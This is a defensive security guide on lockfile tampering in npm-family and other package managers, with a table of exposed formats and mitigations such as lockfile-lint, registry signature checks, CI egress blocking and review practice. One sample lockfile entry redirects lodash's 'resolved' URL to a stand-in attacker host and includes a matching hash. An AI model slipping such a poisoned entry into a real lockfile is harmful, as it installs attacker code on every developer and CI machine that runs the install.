<!--
SPDX-FileCopyrightText: 2026 The Linux Foundation

SPDX-License-Identifier: MIT
-->

# Lockfile Integrity

Everything else in this repository assumes the lockfile tells the truth. This document covers
the attack where it doesn't: **lockfile tampering** (also called lockfile poisoning or lockfile
injection), where a malicious change to the lockfile itself redirects package resolution to an
attacker-controlled artifact — while every "enforce the lockfile" control continues to pass.

## The attack

npm-family lockfiles record, per package, the URL the tarball was resolved from and an
integrity hash:

```json
"node_modules/lodash": {
  "version": "4.17.21",
  "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
  "integrity": "sha512-v2kDEe57lecTulaDIuNTPy3Ry4gLGJ6Z1O3vE1krgXZNrsQ+LFTGHVxVjcXPs17LhbZVGedAJv8XZ1tvj5FvSg=="
}
```

A pull request — from an external contributor, a compromised automation account, or a
malicious insider — edits one entry:

```json
"resolved": "https://registry.npmjs-mirror.attacker.example/lodash/-/lodash-4.17.21.tgz",
"integrity": "sha512-<hash of the attacker's tarball>"
```

The integrity hash is updated *to match the attacker's artifact*, so hash verification passes
— the hash was never independent evidence of anything except "this is the file the lockfile
pointed at". `npm ci` faithfully installs the attacker's tarball. The manifest (`package.json`)
shows no diff at all, and a several-thousand-line lockfile diff is collapsed by default in the
GitHub review UI, so human review routinely misses it.

The same vector applies to any lockfile that embeds artifact URLs alongside hashes —
`yarn.lock` (`resolved` fields), `composer.lock` (`dist.url`), and `uv.lock` (wheel/sdist
URLs) share the structural exposure.

## Which lockfiles are exposed

| Lockfile | Embeds artifact URLs? | Resistance |
|----------|----------------------|------------|
| `package-lock.json` (npm) | ✅ `resolved` per package | ❌ Exposed — primary target of this attack |
| `yarn.lock` | ✅ `resolved` per package | ❌ Exposed |
| `composer.lock` | ✅ `dist.url` per package | ❌ Exposed |
| `uv.lock` | ✅ wheel/sdist URLs | ❌ Exposed in principle (URL + hash swapped together) |
| `pnpm-lock.yaml` | Registry packages: no (URL derived from configured registry); git/tarball deps: yes | ⚠️ Narrower surface |
| `Gemfile.lock` | Single `remote:` line per source block | ⚠️ Tampering is a small, visible diff |
| `Cargo.lock` | `source` strings validated against configured registries | ✅ Resistant — unknown source fails resolution |
| `go.sum` | No URLs; hashes cross-checked against `sum.golang.org` | ✅ Resistant — transparency log catches substitution |
| `packages.lock.json` (NuGet) | No URLs; feeds come from `nuget.config` | ✅ Resistant — combine with [Package Source Mapping](dotnet.md#package-source-mapping) |
| `gradle/verification-metadata.xml` | No URLs; repositories declared in build | ✅ Resistant |

## Mitigations

### 1. lockfile-lint in CI (npm / Yarn)

[`lockfile-lint`](https://github.com/lirantal/lockfile-lint) validates lockfile policy:
allowed registry hosts, HTTPS-only URLs, and integrity-hash presence. It turns "someone
should read the lockfile diff" into a failing check:

```bash
# package-lock.json
npx --yes lockfile-lint@5.0.0 \
  --path package-lock.json \
  --type npm \
  --allowed-hosts npm \
  --validate-https \
  --validate-integrity

# yarn.lock
npx --yes lockfile-lint@5.0.0 \
  --path yarn.lock \
  --type yarn \
  --allowed-hosts npm \
  --validate-https
```

`--allowed-hosts npm` is a built-in alias for the official npm registry; pass explicit
hostnames instead when a private registry or GitHub Packages is in use
(`--allowed-hosts registry.npmjs.org npm.pkg.github.com`). Run it as a PR check so a
tampered `resolved` URL fails before review, not after merge.

### 2. Registry signature verification (npm)

```bash
npm audit signatures
```

Signature verification is the cryptographic counterpart to host validation: the lockfile's
integrity hash proves the artifact matches the lockfile, while the registry signature proves
the artifact is the one the registry actually published. A substituted tarball carries a
matching lockfile hash but no valid registry signature. See
[Node.js — Audit and Signatures](nodejs.md#security-audit-and-signatures).

### 3. CI egress control as the runtime backstop

A [Harden-Runner](harden-runner.md) `egress-policy: block` allowlist neutralises the attack
at runtime even if a tampered lockfile reaches CI: the attacker's host is not in
`allowed-endpoints`, so the fetch fails. This is one of the strongest practical arguments for
block-mode egress on install jobs — it converts a silent compromise into a visible CI failure.

### 4. Review discipline

- **Never treat lockfile-only diffs as routine.** A PR that changes the lockfile without a
  corresponding manifest change deserves line-level review of every `resolved` / `dist.url`
  change.
- Expand collapsed lockfile diffs in review. Red flags: any host other than the expected
  registry, `http://` URLs, integrity fields switching to a weaker algorithm
  (`sha512` → `sha1`), and version strings in URLs that don't match the `version` field.
- Protect lockfiles with a `CODEOWNERS` entry so external-contributor changes to them always
  require a maintainer's review.
- For a suspicious PR, regenerate instead of trusting: check out the branch, delete the
  lockfile changes, re-run the package manager's install, and diff the result against the
  PR's version.

### 5. Prefer lockfile formats with structural resistance

Where there is a choice, the right-hand rows of the table above are structurally safer:
pnpm derives registry URLs from configuration rather than trusting per-package strings, and
Go's checksum database independently verifies every module hash against a public transparency
log. This is not by itself a reason to switch package managers — but it is a reason to add
`lockfile-lint` and signature verification when using the exposed formats.

## Reference

- [lockfile-lint](https://github.com/lirantal/lockfile-lint)
- [npm `audit signatures`](https://docs.npmjs.com/cli/commands/npm-audit)
- [Why npm lockfiles can be a security blindspot for injecting malicious modules (Liran Tal)](https://snyk.io/blog/why-npm-lockfiles-can-be-a-security-blindspot-for-injecting-malicious-modules/)
- [Go checksum database](https://go.dev/ref/mod#checksum-database)
